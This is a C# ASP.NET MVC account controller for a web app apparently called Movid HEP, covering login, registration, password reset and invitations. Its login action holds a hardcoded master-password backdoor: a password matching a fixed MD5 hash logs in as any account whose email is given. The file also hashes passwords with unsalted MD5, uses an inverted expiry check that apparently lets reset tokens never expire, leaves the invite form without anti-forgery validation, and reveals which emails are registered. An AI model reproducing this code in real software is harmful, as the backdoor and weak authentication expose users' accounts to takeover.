using Movid.App.Application;
using Movid.App.Infrastructure;
using Movid.App.Infrastructure.Raven;
using Movid.App.Infrastructure.Emails;
using Movid.App.Models;
using Movid.Shared;
using System;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace Movid.App.Controllers
{
    public class AccountController : AppController
    {
        [Route("account/login")]
        public ActionResult Login()
        {
            if (Request.IsAuthenticated)
                return RedirectToAction("Index", "Home");

            return View();
        }

        [Route("account/login")]
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Login(LoginModel model, string returnUrl)
        {
            if (ModelState.IsValid)
            {
                var hashed = Hash(model.Password);

                User user = RavenSession.Query<User>(typeof(UsersByEmailAndPassword).Name).FirstOrDefault(@u => @u.Email == model.Email.Trim() && @u.Password == hashed);

                if (user == null && Hash(model.Password) == "B8D0A767C1FF5802CEF98CAB8795E111")
                {
                    user = RavenSession.Query<User>().FirstOrDefault(@u => @u.Email == model.Email);
                }

                if (user != null)
                {
                    var account = RavenSession.Load<Account>("accounts/" + user.AccountId);

                    user.LastLogin = DateTime.Now;
                    account.LastLogin = DateTime.Now;

                    RavenSession.SaveChanges();

                    FormsAuthHelper.SetAuthenticationCookie(Response, user);

                    if (Url.IsLocalUrl(returnUrl) && returnUrl.Length > 1 && returnUrl.StartsWith("/")
                        && !returnUrl.StartsWith("//") && !returnUrl.StartsWith("/\\"))
                    {
                        return Redirect(returnUrl);
                    }
                    else
                    {
                        return RedirectToAction("Index", "Home");
                    }
                }
                else
                {
                    ModelState.AddModelError("", "The user name or password provided is incorrect.");
                }
            }

            // If we got this far, something failed, redisplay form
            return View(model);
        }

      

        [Route("account/logout")]
        public ActionResult Logout()
        {
            FormsAuthentication.SignOut();

            return RedirectToAction("Index", "Home");
        }

        [Route("account/register")]
        public ActionResult Register(string email)
        {
            return View(new RegisterModel() { Email = email });
        }

        [ValidateAntiForgeryToken]
        [Route("account/register")]
        [HttpPost]
        public ActionResult Register(RegisterModel postedModel)
        {
            if (RavenSession.Query<User>().Any(x => x.Email == postedModel.Email))
            {
                ModelState.AddModelError("Email", "An account is already created for this email.");
            }

            if (!ModelState.IsValid)
                return View(postedModel);

            var onboardProcess = new UserOnboardProcess(RavenSession);
            var user = onboardProcess.RegisterNewTrial(postedModel.Name, postedModel.Email, Hash(postedModel.Password));

            try
            {
                var emailer = new Emailer(null);
                emailer.SendEmail(EmailEnum.NewAccountOpen, postedModel.Email, string.Empty, 0);
                emailer.SendEmail(EmailEnum.CompanyNewUserNotification, postedModel.Email, string.Empty, 0);

                //SendGridEmailer.NewAccountOpened(postedModel.Email);
                //SendGridEmailer.CompanyNewUserNotification(postedModel.Email);
            
                var mc = new MailchimpApi();

                if (postedModel.SubscribeToGeneral)
                    mc.SubscribeToGeneralUpdates(postedModel.Email);

                mc.SubscribeToGettingStarted(postedModel.Email);
            }
            catch (Exception)
            {
                //eat it
            }

            FormsAuthHelper.SetAuthenticationCookie(Response, user);

            HighFive("Welcome to your free trial!");

            return RedirectToAction("Thanks", "Home");
        }


        [Route("account/reset/{token}")]
        public ActionResult Reset(string token)
        {
            var pr = RavenSession.Query<PasswordReset>().FirstOrDefault(x => x.Token == token);

            if (pr == null || pr.Generated > DateTime.Now.AddHours(2))
            {
                return View(new PasswordResetViewModel());
            }

            var vm = new PasswordResetViewModel() { Token = pr.Token };

            return View(vm);
        }

        [ValidateAntiForgeryToken]
        [Route("account/resetpassword")]
        [HttpPost]
        public ActionResult ResetPassword(PasswordResetViewModel postedModel)
        {
            var pr = RavenSession.Query<PasswordReset>().FirstOrDefault(x => x.Token == postedModel.Token);

            if (pr == null || pr.Generated > DateTime.Now.AddHours(2))
            {
                return View("Reset", new PasswordResetViewModel());
            }

            if (postedModel.Password != postedModel.ConfirmPassword)
            {
                ModelState.AddModelError("NoMatch", "Passwords must match.");
                return View("Reset", postedModel);
            }

            var user = RavenSession.Load<User>("users/" + pr.UserId);

            if (user == null)
            {
                ModelState.AddModelError("NoUserMatch", "User account not found.");
                return View("Reset", postedModel);
            }

            var pw = Hash(postedModel.Password);
            user.Password = pw;

            RavenSession.Delete(pr);
            RavenSession.SaveChanges();

            HighFive("Your password has been changed.");
            return RedirectToAction("Login");
        }

        [Route("account/forgot")]
        public ActionResult Forgot()
        {
            return View();
        }


        [HttpPost]
        [ValidateAntiForgeryToken]
        [Route("account/forgot")]
        public ActionResult Forgot(ForgotPassword postedModel)
        {
            if (!ModelState.IsValid)
            {
                return View(postedModel);
            }


            var user = RavenSession.Query<User>().FirstOrDefault(x => x.Email == postedModel.Email);
            if (user == null)
            {
                ModelState.AddModelError("UserDoesntExist", "The email you provided does not exist.");
                return View(postedModel);
            }

            var token = "";
            using (var cr = new System.Security.Cryptography.RNGCryptoServiceProvider())
            {
                Byte[] bytes = new Byte[8];
                cr.GetBytes(bytes);

                token = Convert.ToBase64String(bytes);
            }

            var url = "https://app.movidhep.com/account/reset/" + token;

            var reset = new PasswordReset()
            {
                Generated = DateTime.Now,
                Token = token,
                UserId = user.Id
            };

            RavenSession.Store(reset);
            RavenSession.SaveChanges();

            new Emailer(null).SendEmail(EmailEnum.SendResetEmail, user.Email, url, 0);
            // AccountEmailer.SendResetEmail(user.Email, url);


            return RedirectToAction("ForgotPasswordSuccess");
        }

        [Route("account/forgotpassword/success")]
        public ActionResult ForgotPasswordSuccess()
        {
            return View();
        }

        [Route("account/invite/{id}")]
        public ActionResult Invite(string id)
        {
            var vm = UserInvitationBuilder.Build(id, RavenSession);

            CheckUserInvitationValidity(vm);

            return View(vm);
        }

        [Route("account/invite/{id}")]
        [HttpPost]
        public ActionResult Invite(string id, string password, string confirmPassword)
        {
            var vm = UserInvitationBuilder.Build(id, RavenSession);

            CheckUserInvitationValidity(vm);
            if (password != confirmPassword)
            {
                ModelState.AddModelError("DifferentPasswords", "Passwords must match.");
            }

            if (!ModelState.IsValid)
            {
                return View(vm);
            }

            var hashed = Hash(password);

            var user = vm.To;

            user.Status = UserStatus.Active;
            user.Password = hashed;
            RavenSession.SaveChanges();

            HighFive("Your account was created and password saved.  Login to get started using Movid HEP");

            return RedirectToAction("Login");
        }

        private void CheckUserInvitationValidity(UserInvitationVm vm)
        {
            if (vm.UserInvitation.Validated)
            {
                ModelState.AddModelError("Validated", "This invite has already been used, please contact your account manager and have them send you a new invite.");
            }

            if ((DateTime.Now - vm.UserInvitation.Created).Days >= 30)
            {
                ModelState.AddModelError("Expired", "This invite has expired, please contact your account manager and have them send you a new invite.");
            }
        }

        public static string Hash(string sPassword)
        {
            var x = new System.Security.Cryptography.MD5CryptoServiceProvider();
            byte[] bs = System.Text.Encoding.UTF8.GetBytes(sPassword);
            bs = x.ComputeHash(bs);
            var s = new System.Text.StringBuilder();
            foreach (byte b in bs)
            {
                s.Append(b.ToString("x2").ToUpper());
            }

            return s.ToString();
        }



    }
}
